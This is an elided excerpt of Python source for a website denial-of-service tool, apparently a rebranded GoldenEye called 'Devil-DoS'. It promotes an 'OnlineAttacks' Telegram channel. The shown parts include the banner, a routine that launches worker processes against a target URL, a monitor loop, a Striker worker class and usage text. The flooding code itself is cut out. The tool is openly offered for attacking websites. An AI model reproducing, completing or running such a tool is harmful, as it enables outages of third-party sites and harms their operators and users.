...
@author Uttam Singh <t.me/onlineattacks/>
...
GOLDENEYE_BANNER = 'Devil-DoS A DoS Tool By Uttam Sing t.me/OnlineAttacks. Join @OnlineAttacks For More'
...
class GoldenEye(object):
    ...
    def fire(self):
        ...
        self.printHeader()
        print("Fucking Website Mode '{0}' with {1} IPs In Work {2} Threads each. To Stop Attack Press CTRL+C .".format(self.method, self.nr_workers, self.nr_sockets))
        ...
        for i in range(int(self.nr_workers)):
            ...
            try:
                ...
                error("Failed to start Devil-DoS {0}".format(i))
                pass
    ...
    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                ...
                print("CTRL+C received. Exiting Devil-DoS")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print("Killing IPs {0}".format(worker.name))
                        #worker.terminate()
                        worker.stop()
                    except Exception:
                        pass # silently ignore
...
class Striker(Process):
    ...
    def run(self):
        ...
        if DEBUG:
            print("Starting IPs {0}".format(self.name))
...
def usage():
    ...
    print(GOLDENEYE_BANNER)
    print()
    print(' USAGE: ./devil.py <url> [OPTIONS]')
    print()
    print(' OPTIONS:')
